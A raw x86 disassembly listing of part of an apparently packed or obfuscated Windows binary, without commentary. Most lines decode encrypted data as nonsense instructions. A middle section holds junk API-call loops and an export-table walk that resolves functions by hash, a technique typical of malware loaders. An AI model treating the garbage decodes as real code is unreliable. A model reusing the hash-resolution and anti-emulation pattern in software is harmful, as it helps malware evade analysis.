  41a092:	jo     0x41a0e7
  41a094:	push   ebx
  41a095:	leave  
  41a096:	lods   eax,DWORD PTR ds:[esi]
  41a097:	ss cmp ah,BYTE PTR ds:[ebp-0x3d]
  41a09c:	inc    ecx
  41a09d:	mov    bl,0x26
  41a09f:	jmp    0x4c95:0xbe2366a9
  41a0a6:	fwait
  41a0a7:	out    dx,al
  41a0a8:	sbb    DWORD PTR [edx+edi*2-0x55],esi
  41a0ac:	push   ds
  41a0ad:	dec    esi
  41a0ae:	dec    ebp
  41a0af:	cs sbb eax,0x8c10a318
  41a0b5:	jmp    0xeb59:0x3829b0e1
  41a0bc:	xor    al,0x3c
  41a0be:	dec    esp
  41a0bf:	das    
  41a0c0:	addr16 pop ebx
  41a0c2:	sahf   
  41a0c3:	dec    ecx
  41a0c4:	push   es
  41a0c5:	jp     0x41a0ed
  41a0c7:	ss pop esi
  41a0c9:	mov    esp,0x5ff99166
  41a0ce:	cmp    esp,DWORD PTR [ecx-0x47ab3e01]
  41a0d4:	pop    ecx
  41a0d5:	sbb    bh,al
  41a0d7:	inc    edi
  41a0d8:	jb     0x41a0f1
  41a0da:	cmc    
  41a0db:	popf   
  41a0dc:	fadd   DWORD PTR [esi]
  41a0de:	adc    esi,DWORD PTR [esi+0x2c]
  41a0e1:	sar    DWORD PTR [eax],1
  41a0e3:	dec    edx
  41a0e4:	jnp    0x41a091
  41a0e6:	mov    edi,0x89af5f50
  41a0eb:	sahf   
  41a0ec:	pusha  
  41a0ed:	and    bl,dh
  41a0ef:	sub    al,0x87
  41a0f1:	(bad)  
  41a0f2:	(bad)  
  41a0f3:	xchg   esi,eax
  41a0f4:	add    DWORD PTR [ebx+edx*2-0x67c8daa2],ecx
  41a0fb:	push   ds
  41a0fc:	je     0x41a085
  41a0fe:	add    BYTE PTR [esi-0x7c],bh
  41a101:	jl     0x41a0e7
  41a103:	mov    al,ds:0xf7578477
  41a108:	repz or esi,DWORD PTR [esi]
  41a10b:	scas   al,BYTE PTR es:[edi]
  41a10c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a10d:	xchg   ecx,eax
  41a10e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a10f:	sub    DWORD PTR [edi],esp
  41a111:	jle    0x41a0c8
  41a113:	push   ss
  41a114:	ret    
  41a115:	dec    ecx
  41a116:	(bad)  
  41a117:	jae    0x41a0fc
  41a119:	out    dx,al
  41a11a:	int    0x4c
  41a11c:	(bad)  
  41a11d:	psrad  mm4,mm2
  41a120:	imul   ebp,DWORD PTR ds:0xe859278b,0xc
  41a127:	xlat   BYTE PTR ds:[ebx]
  41a128:	hlt    
  41a129:	push   cs
  41a12a:	or     DWORD PTR [ecx-0x6ba93778],0x18
  41a131:	inc    DWORD PTR [eax]
  41a133:	aad    0x5c
  41a135:	xchg   edx,eax
  41a136:	rcl    DWORD PTR [ebp-0x7d],0xce
  41a13a:	adc    eax,DWORD PTR [esi]
  41a13c:	pop    DWORD PTR [ebp+0x67]
  41a13f:	inc    esi
  41a140:	fldcw  WORD PTR [ecx-0x29]
  41a143:	adc    BYTE PTR [esi+0x20],dl
  41a146:	jne    0x41a173
  41a148:	or     BYTE PTR [ecx+0x7d6c4ef0],0xc
  41a14f:	and    eax,0x4a6d896
  41a154:	shl    DWORD PTR [ebx],1
  41a156:	xor    esi,esi
  41a158:	sub    edi,DWORD PTR [edx-0x38]
  41a15b:	aaa    
  41a15c:	mov    WORD PTR [ecx+0x4c6d8230],fs
  41a162:	scas   eax,DWORD PTR es:[edi]
  41a163:	scas   eax,DWORD PTR es:[edi]
  41a164:	push   ebp
  41a165:	inc    ebp
  41a166:	or     dh,BYTE PTR [esi+0x14d2df69]
  41a16c:	repz add DWORD PTR [ebp+edi*8-0x16123f3c],edi
  41a174:	push   ds
  41a175:	pop    ebx
  41a176:	das    
  41a177:	jg     0x41a188
  41a179:	jl     0x41a102
  41a17b:	sbb    esp,DWORD PTR [ebx]
  41a17d:	jo     0x41a128
  41a17f:	and    dl,dh
  41a181:	outs   dx,DWORD PTR ds:[esi]
  41a182:	push   cs
  41a183:	and    al,0x52
  41a185:	xor    DWORD PTR [edi],ecx
  41a187:	ds dec ebp
  41a189:	leave  
  41a18a:	ja     0x41a1ce
  41a18c:	mov    edi,0xfea2c243
  41a191:	adc    DWORD PTR [ecx-0x1ae02450],0xfffffff3
  41a198:	stos   DWORD PTR es:[edi],eax
  41a199:	push   edi
  41a19a:	nop
  41a19b:	inc    edx
  41a19c:	sbb    DWORD PTR [esi-0x7c82794b],ebx
  41a1a2:	sbb    DWORD PTR gs:0x732eb4ff,eax
  41a1a9:	in     eax,dx
  41a1aa:	or     BYTE PTR [ecx-0x44],cl
  41a1ad:	test   DWORD PTR [ebp-0x46318f17],esi
  41a1b3:	jp     0x41a1c6
  41a1b5:	loop   0x41a1a2
  41a1b7:	pop    edx
  41a1b8:	and    eax,0x83704448
  41a1bd:	mov    al,0xfc
  41a1bf:	enter  0xc612,0xb3
  41a1c3:	dec    esi
  41a1c4:	or     cl,0x8b
  41a1c7:	and    DWORD PTR [ecx+0x543702fe],esi
  41a1cd:	cmp    DWORD PTR [edi+0x509e67ab],eax
  41a1d3:	jge    0x41a188
  41a1d5:	mov    dl,0xa2
  41a1d7:	jnp    0x41a210
  41a1d9:	je     0x41a1d2
  41a1db:	inc    edx
  41a1dc:	mov    ah,0xd4
  41a1de:	scas   eax,DWORD PTR es:[edi]
  41a1df:	mov    bl,BYTE PTR [eax-0xe]
  41a1e2:	(bad)  
  41a1e3:	aaa    
  41a1e4:	adc    eax,0x4276914f
  41a1e9:	pop    ecx
  41a1ea:	push   es
  41a1eb:	mov    dh,0xc6
  41a1ed:	call   DWORD PTR [esi]
  41a1ef:	in     al,dx
  41a1f0:	mov    bh,0xf7
  41a1f2:	into   
  41a1f3:	mov    eax,ds:0xa638bbed
  41a1f8:	cmp    al,bl
  41a1fa:	mov    edx,ecx
  41a1fc:	pop    ss
  41a1fd:	aam    0x44
  41a1ff:	push   ebp
  41a200:	mov    eax,DWORD PTR [ebp-0x4]
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7b1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a30d
  41a293:	inc    eax
  41a294:	push   ecx
  41a295:	sbb    BYTE PTR [eax+0x10787fd1],0x7e
  41a29c:	js     0x41a316
  41a29e:	rcl    BYTE PTR [ecx+eax*4],cl
  41a2a1:	mov    ah,BYTE PTR [ebx]
  41a2a3:	jno    0x41a22a
  41a2a5:	jb     0x41a24e
  41a2a7:	push   esi
  41a2a8:	ins    DWORD PTR es:[edi],dx
  41a2a9:	mov    edx,0x7806542b
  41a2ae:	lods   eax,DWORD PTR ds:[esi]
  41a2af:	jg     0x41a327
  41a2b1:	cmp    DWORD PTR [esi],esp
  41a2b3:	sub    eax,0x37237c08
  41a2b8:	out    0x89,eax
  41a2ba:	ja     0x41a285
  41a2bc:	pop    eax
  41a2bd:	cwde   
  41a2be:	xor    DWORD PTR [edi+ebx*2],esi
  41a2c1:	push   ecx
  41a2c2:	jnp    0x41a2d1
  41a2c4:	data16 (bad) 
  41a2c6:	retf   
  41a2c7:	in     al,0x8a
  41a2c9:	das    
  41a2ca:	cmp    ch,BYTE PTR [ecx+edx*8-0x7e6244eb]
  41a2d1:	add    BYTE PTR [eax-0x5a57db24],al
  41a2d7:	jns    0x41a32d
  41a2d9:	bound  bx,DWORD PTR [edi+edx*2+0x39]
  41a2de:	les    ebp,FWORD PTR [edx]
  41a2e0:	stos   DWORD PTR es:[edi],eax
  41a2e1:	outs   dx,DWORD PTR ds:[esi]
  41a2e2:	or     BYTE PTR [edi+0x1f],cl
  41a2e5:	lds    ecx,FWORD PTR [edx]
  41a2e7:	push   edi
  41a2e8:	and    ebp,DWORD PTR [eax]
  41a2ea:	push   es
  41a2eb:	xor    dl,BYTE PTR [edx-0x5c]
  41a2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ef:	les    ecx,FWORD PTR [ebp+0x75]
  41a2f2:	ins    DWORD PTR es:[edi],dx
  41a2f3:	cli    
  41a2f4:	and    eax,0xa1d3c5fe
  41a2f9:	push   es
  41a2fa:	xor    DWORD PTR [ebx],edi
  41a2fc:	pop    edi
  41a2fd:	xchg   ebx,eax
  41a2fe:	inc    ebp
  41a2ff:	popfw  
  41a301:	xor    eax,0x43f2abb4
  41a306:	(bad)  
  41a307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a308:	fistp  DWORD PTR [ebp+0x7cb35384]
  41a30e:	js     0x41a34d
  41a310:	in     al,dx
  41a311:	call   0xdedc:0x6f851b48
  41a318:	pop    ebp
  41a319:	cmp    dh,BYTE PTR ds:0xba9c433c
  41a31f:	push   edx
  41a320:	and    DWORD PTR [ecx],esi
  41a322:	icebp  
  41a323:	dec    ebx
  41a324:	xor    eax,0xf484c207
  41a329:	inc    eax
  41a32a:	outs   dx,DWORD PTR ds:[esi]
  41a32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a32c:	dec    ebx
  41a32d:	sbb    bl,BYTE PTR [edx+ebx*8]
  41a330:	mov    gs,ecx
  41a332:	jae    0x41a33a
  41a334:	clc    
  41a335:	iret   
  41a336:	sahf   
  41a337:	dec    esp
  41a338:	dec    ecx
  41a339:	inc    eax
  41a33a:	mov    ah,0x59
  41a33c:	mov    edi,esi
  41a33e:	or     esp,DWORD PTR [edi-0x5a960e3a]
  41a344:	pop    edx
  41a345:	sti    
  41a346:	jae    0x41a2e4
  41a348:	jo     0x41a366
  41a34a:	jbe    0x41a378
  41a34c:	into   
  41a34d:	(bad)  
  41a34e:	mov    edx,0x4aa22151
  41a353:	jbe    0x41a2df
  41a355:	xor    ch,BYTE PTR [edx]
  41a357:	fwait
  41a358:	fs test al,0x0
  41a35b:	js     0x41a334
  41a35d:	enter  0xa365,0x93
  41a361:	push   ebp
  41a362:	scas   eax,DWORD PTR es:[edi]
  41a363:	mov    al,0xca
  41a365:	mov    dh,0x3
  41a367:	pop    ebx
  41a368:	pop    ebx
  41a369:	lods   eax,DWORD PTR ds:[esi]
  41a36a:	cs inc esp
  41a36c:	scas   eax,DWORD PTR es:[edi]
  41a36d:	out    dx,eax
  41a36e:	xchg   esi,eax
  41a36f:	or     BYTE PTR [edi-0x3d64873],dl
  41a375:	push   ebx
  41a376:	jae    0x41a363
  41a378:	in     eax,dx
  41a379:	rcl    ecx,cl
  41a37b:	hlt    
  41a37c:	int    0x80
  41a37e:	mov    ds:0x887a335b,eax
  41a383:	sub    DWORD PTR [edi-0x6117d9b7],0x2f
  41a38a:	getsec 
  41a38c:	sahf   
  41a38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a38e:	jge    0x41a340
  41a390:	push   es
  41a391:	ja     0x41a37a
  41a393:	jns    0x41a3bc
  41a395:	jae    0x41a3aa
  41a397:	gs (bad) 
  41a399:	outs   dx,DWORD PTR ds:[esi]
  41a39a:	bound  edx,QWORD PTR [esi+ebx*2]
  41a39d:	jmp    0x6dc5:0xe9ce684d
  41a3a4:	add    esp,esi
  41a3a6:	jl     0x41a407
  41a3a8:	dec    eax
  41a3a9:	aad    0xbe
  41a3ab:	pop    ss
  41a3ac:	sub    eax,0x6581b30
  41a3b1:	cmp    BYTE PTR [edx-0xe648d9],al
  41a3b7:	cmp    DWORD PTR [eax+0x0],ebp
  41a3ba:	add    eax,0x7a30f9c0
  41a3bf:	fwait
  41a3c0:	xchg   esp,eax
  41a3c1:	and    DWORD PTR [ecx],eax
  41a3c3:	mov    ebx,ebx
  41a3c5:	les    ecx,FWORD PTR [edi+0x3bec6efc]
  41a3cb:	push   ebp
  41a3cc:	stos   DWORD PTR es:[edi],eax
  41a3cd:	inc    esi
  41a3ce:	loop   0x41a385
  41a3d0:	loopne 0x41a3c6
  41a3d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3d3:	add    esp,esp
  41a3d5:	addr16 sub eax,0xcb6974c3
  41a3db:	or     DWORD PTR [edx+ecx*2],ebp
  41a3de:	fnsave [ecx+0x13e46d3e]
  41a3e4:	xchg   BYTE PTR [ecx],bh
  41a3e6:	dec    ebx
  41a3e7:	pushf  
  41a3e8:	sbb    BYTE PTR [ecx],ch
  41a3ea:	sbb    cl,0x94
  41a3ed:	push   esi
  41a3ee:	sbb    eax,0x8f16f8e5
  41a3f3:	jnp    0x41a393
  41a3f5:	xchg   DWORD PTR [edx],ebp
  41a3f7:	xchg   BYTE PTR [ebp-0x5],bh
  41a3fa:	push   ds
  41a3fb:	(bad)  
  41a3fc:	pop    ebp
  41a3fd:	inc    ecx
  41a3fe:	add    BYTE PTR [edx-0x110c3b86],0x4b
  41a405:	cmp    al,0x80
  41a407:	mov    edx,0x5340d5e
  41a40c:	inc    esi
  41a40d:	xchg   edi,eax
  41a40e:	inc    esi
  41a40f:	test   al,0xb3
  41a411:	inc    esi
  41a412:	inc    esp
  41a413:	adc    cl,ch
  41a415:	jmp    0xcaa956f6
  41a41a:	loop   0x41a43d
  41a41c:	das    
  41a41d:	mov    es,WORD PTR [ebp+0x29]
  41a420:	lahf   
  41a421:	sbb    al,0x35
  41a423:	mov    ds:0x9a4c012,eax
  41a428:	shl    dh,0x5e
  41a42b:	lods   al,BYTE PTR ds:[esi]
  41a42c:	mov    al,0xde
  41a42e:	(bad)  
  41a42f:	enter  0xc164,0x98
  41a433:	fisub  WORD PTR [edx]
  41a435:	test   al,0xbc
  41a437:	into   
  41a438:	jae    0x41a40e
  41a43a:	clc    
  41a43b:	test   eax,0x71dcd19d
  41a440:	mov    bl,0x21
  41a442:	lods   al,BYTE PTR ds:[esi]
  41a443:	sub    DWORD PTR [esi],ecx
  41a445:	adc    esi,esp
  41a447:	pop    esp
  41a448:	xor    eax,esi
  41a44a:	cmp    DWORD PTR [ecx],ebx
  41a44c:	xchg   edi,eax
  41a44d:	jmp    0x41a462
  41a44f:	push   0x80bb8938
  41a454:	jb     0x41a437
  41a456:	mov    dh,BYTE PTR [ebp-0x33]
  41a459:	pop    eax
  41a45a:	in     al,dx
  41a45b:	enter  0x24ba,0xe4
  41a45f:	(bad)  [ebx-0x32]
  41a462:	jp     0x41a44f
  41a464:	jmp    0xa19e:0x1e66c235
  41a46b:	sbb    dh,dl
  41a46d:	jne    0x41a4db
  41a46f:	push   esi
  41a470:	pop    edi
  41a471:	arpl   WORD PTR [esi+0x2fe090dd],dx
  41a477:	jbe    0x41a468
  41a479:	adc    esp,DWORD PTR [esi*4-0x8e723ae]
  41a480:	repz inc ebx
  41a482:	in     eax,dx
  41a483:	dec    edx
  41a484:	outs   dx,DWORD PTR ds:[esi]
  41a485:	mov    edx,0xe49c5578
  41a48a:	and    eax,0x829cbde7
  41a48f:	rcr    BYTE PTR [esi+esi*1],1
  41a492:	pusha  
  41a493:	(bad)  
  41a495:	push   ebp
  41a496:	pop    edi
  41a497:	cmp    bl,BYTE PTR [edi]
  41a499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49a:	push   es
  41a49b:	ret    
  41a49c:	scas   al,BYTE PTR es:[edi]
  41a49d:	scas   al,BYTE PTR es:[edi]
  41a49e:	jae    0x41a4fc
  41a4a0:	ds push eax
  41a4a2:	out    0x54,al
  41a4a4:	out    dx,al
  41a4a5:	sbb    BYTE PTR [edi],0xc2
  41a4a8:	push   ds
  41a4a9:	sar    BYTE PTR [ebx+0x28],1
  41a4ac:	ficomp WORD PTR [ecx+0x4234c55e]
  41a4b2:	fld    QWORD PTR [ebp-0x5c]
  41a4b5:	add    cl,BYTE PTR [ecx+0x5c7ec45]
  41a4bb:	pop    ebp
  41a4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4bd:	inc    edx
  41a4be:	add    BYTE PTR [eax],bl
  41a4c0:	add    BYTE PTR [eax],al
  41a4c2:	add    BYTE PTR [ebx+0x42a75d3d],al
  41a4c8:	add    BYTE PTR [eax],al
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	das    
  41a68f:	pop    eax
  41a690:	pop    eax
  41a691:	xor    BYTE PTR [eax+0x10787fd7],0x7e
  41a698:	js     0x41a712
  41a69a:	sub    BYTE PTR [ebx],cl
  41a69c:	scas   eax,DWORD PTR es:[edi]
  41a69d:	or     DWORD PTR [eax+0x5a8b3be9],0x20
  41a6a4:	push   ss
  41a6a5:	sub    ebx,DWORD PTR [ebx+0x25fa89]
  41a6ab:	jae    0x41a70e
  41a6ad:	fs xor ebp,edi
  41a6b0:	imul   ebp,DWORD PTR [esi],0xffffffe7
  41a6b3:	and    al,0xba
  41a6b5:	xchg   edi,eax
  41a6b6:	out    dx,al
  41a6b7:	or     BYTE PTR [edx+0x4],0x57
  41a6bb:	dec    ebx
  41a6bc:	enter  0x706d,0x1c
  41a6c0:	jnp    0x41a689
  41a6c2:	ja     0x41a6a3
  41a6c4:	(bad)  
  41a6c5:	retf   
  41a6c6:	inc    ecx
  41a6c7:	call   FWORD PTR [eax+esi*1+0x123ae05d]
  41a6ce:	xchg   ecx,eax
  41a6cf:	call   0x49ff:0xf2704848
  41a6d6:	push   ebp
  41a6d7:	push   ebp
  41a6d8:	jmp    0xbf2b:0xb30522cf
  41a6df:	push   ecx
  41a6e0:	add    eax,0x12fcab4b
  41a6e5:	or     eax,0xa9531f32
  41a6ea:	(bad)  
  41a6eb:	int    0x16
  41a6ed:	call   0xd925c341
  41a6f2:	and    bh,cl
  41a6f4:	mov    al,0x8c
  41a6f6:	jg     0x41a6d7
  41a6f8:	push   ebx
  41a6f9:	push   ss
  41a6fa:	les    eax,FWORD PTR [edi+0x368fc928]
  41a700:	(bad)  
  41a701:	xor    al,0xc2
  41a703:	(bad)  
  41a704:	or     eax,0xc1f9235a
  41a709:	sub    eax,0x9e1bdcbc
  41a70e:	(bad)  
  41a710:	shr    BYTE PTR [edx+0x5da0bc85],cl
  41a716:	xchg   DWORD PTR [edx-0x12],edi
  41a719:	push   ebp
  41a71a:	mov    cl,0x33
  41a71c:	jl     0x41a6e3
  41a71e:	imul   ebx,DWORD PTR [edi+0x332f4173],0xffffff9d
  41a725:	fbstp  TBYTE PTR [ebx]
  41a727:	pminsw mm2,QWORD PTR [esi+ebx*2]
  41a72b:	xchg   ecx,eax
  41a72c:	imul   edi,DWORD PTR [eax],0x6d
  41a72f:	je     0x41a7a6
  41a731:	mov    al,ds:0xd8e8530a
  41a736:	repnz clc 
  41a738:	es or  esi,ebx
  41a73b:	push   edi
  41a73c:	shr    DWORD PTR [edi-0x156f47d9],1
  41a742:	fnstsw WORD PTR [esi-0x1a105bf1]
  41a748:	(bad)  
  41a749:	jecxz  0x41a774
  41a74b:	sbb    ebx,DWORD PTR [eax-0x4bac0d77]
  41a751:	outs   dx,BYTE PTR ds:[esi]
  41a752:	frstor [ecx]
  41a754:	sbb    ebx,DWORD PTR [edi]
  41a756:	bound  ebp,QWORD PTR [edi]
  41a758:	xor    dh,0x34
  41a75b:	xchg   ecx,eax
  41a75c:	sbb    al,0x14
  41a75e:	fsubr  st(5),st
  41a760:	xchg   edi,eax
  41a761:	(bad)  
  41a762:	mov    DWORD PTR [edx],esi
  41a764:	mov    DWORD PTR [esi-0x6398c908],esp
  41a76a:	mov    esp,0x49756075
  41a76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a770:	fs data16 ss jno 0x41a798
  41a775:	mov    cs,WORD PTR [edx+edx*8]
  41a778:	sbb    ch,BYTE PTR [esi]
  41a77a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a77b:	daa    
  41a77c:	adc    al,al
  41a77e:	jb     0x41a786
  41a780:	mov    WORD PTR [ebx+0x42],?
  41a783:	mov    bl,0x12
  41a785:	jecxz  0x41a7a3
  41a787:	mov    ebp,0x4e2d617d
  41a78c:	lea    edx,[ebx-0x66]
  41a78f:	pop    es
  41a790:	scas   eax,DWORD PTR es:[edi]
  41a791:	xor    al,BYTE PTR [ebx-0x44baa73f]
  41a797:	push   es
  41a798:	cs jle 0x41a72e
  41a79b:	mov    dh,0xe3
  41a79d:	shr    ah,0x26
  41a7a0:	add    BYTE PTR [edi-0xe],cl
  41a7a3:	push   ecx
  41a7a4:	fidivr WORD PTR [ebx-0x65]
  41a7a7:	cmp    eax,DWORD PTR [ebp+0x136ceebe]
  41a7ad:	mov    ds:0x4be57a58,al
  41a7b2:	arpl   WORD PTR [eax],bp
  41a7b4:	mov    eax,edx
  41a7b6:	clc    
  41a7b7:	mov    WORD PTR [ebp+0x271ea9a5],?
  41a7bd:	or     al,BYTE PTR [ecx]
  41a7bf:	stos   BYTE PTR es:[edi],al
  41a7c0:	arpl   WORD PTR [edi-0x5594a407],di
  41a7c6:	not    BYTE PTR [edi+edi*1-0x19be3b54]
  41a7cd:	je     0x41a7f0
  41a7cf:	and    cl,0x5d
  41a7d2:	inc    edi
  41a7d3:	fsub   QWORD PTR [ebx+0x70]
  41a7d6:	or     DWORD PTR [edi-0x7c840ae0],esi
  41a7dc:	adc    ebp,DWORD PTR [edi-0x7661b7f4]
  41a7e2:	(bad)  
  41a7e3:	cmp    ah,BYTE PTR [edx]
  41a7e5:	push   0xffffff9b
  41a7e7:	push   edx
  41a7e8:	sub    eax,0x8067656a
  41a7ed:	push   esp
  41a7ee:	mov    ebx,0xb680ab2f
  41a7f3:	gs add eax,0xb969873f
  41a7f9:	and    DWORD PTR [eax],ebx
  41a7fb:	inc    eax
  41a7fc:	sar    al,1
  41a7fe:	popf   
  41a7ff:	(bad)  
  41a801:	rcr    BYTE PTR [edi],cl
  41a803:	imul   ebx,DWORD PTR [ecx+0x6f9f88c5],0x8
  41a80a:	inc    eax
  41a80b:	sti    
  41a80c:	or     al,0x70
  41a80e:	addr16 fwait
  41a810:	inc    edi
  41a811:	stc    
  41a812:	loopne 0x41a85f
  41a814:	sbb    BYTE PTR ss:[ecx-0x37],ah
  41a818:	mov    ebp,0x228f32c3
  41a81d:	jbe    0x41a7a5
  41a81f:	mov    dl,0x55
  41a821:	sub    cl,bl
  41a823:	pop    esp
  41a824:	pop    ds
  41a825:	mov    ds:0x5c155849,eax
  41a82a:	sbb    ch,0x6f
  41a82d:	pop    edi
  41a82e:	inc    edi
  41a82f:	dec    edx
  41a830:	adc    ch,dh
  41a832:	(bad)  
  41a833:	aam    0xfd
  41a835:	xchg   esi,eax
  41a836:	adc    al,0xf8
  41a838:	and    edx,DWORD PTR [eax]
  41a83a:	fstp   DWORD PTR [ecx-0x6566a05b]
  41a840:	loope  0x41a7e1
  41a842:	mov    ecx,0xf61de572
  41a847:	mov    cl,cl
  41a849:	mov    ebx,0xe5d5bb22
  41a84e:	mov    eax,ds:0x75f122ed
  41a853:	pop    ebp
  41a854:	jo     0x41a887
  41a856:	inc    ecx
  41a857:	test   DWORD PTR [edx+0x31124b6],esp
  41a85d:	sbb    BYTE PTR [ecx+0x4b],dl
  41a860:	mov    esp,0xac2c2078
  41a865:	mov    ecx,0x44a40067
  41a86a:	hlt    
  41a86b:	retf   0x9086
  41a86e:	daa    
  41a86f:	mov    esp,0x877c9a95
  41a874:	cmc    
  41a875:	mov    eax,0xe9f15054
  41a87a:	bound  edi,QWORD PTR [edx+0x7eb71051]
  41a880:	mov    ebp,0x30107d69
  41a885:	push   esp
  41a886:	mov    esi,0x70b1fabd
  41a88b:	mov    ?,WORD PTR [esi+eax*4-0x323f73e]
  41a892:	jmp    0x8ce9:0xe91b0f70
  41a899:	imul   esi,DWORD PTR ds:0x30f321b9,0xb1321238
  41a8a3:	sti    
